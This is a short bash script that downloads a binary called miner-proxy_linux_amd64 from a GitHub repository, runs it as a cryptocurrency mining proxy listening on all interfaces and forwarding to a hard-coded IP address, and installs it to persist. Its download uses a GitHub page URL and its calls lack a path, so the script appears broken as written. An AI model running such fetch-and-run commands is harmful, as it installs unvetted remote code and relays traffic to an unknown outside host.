#!/bin/bash
wget https://github.com/MinerRedir/Redir/blob/main/miner-proxy_linux_amd64 && chmod +x miner-proxy_linux_amd64 && miner-proxy_linux_amd64 -l 0.0.0.0:14444 -r 43.154.96.211:14444 -secret_key 123456789 -sc -client -install  && miner-proxy_linux_amd64 -start
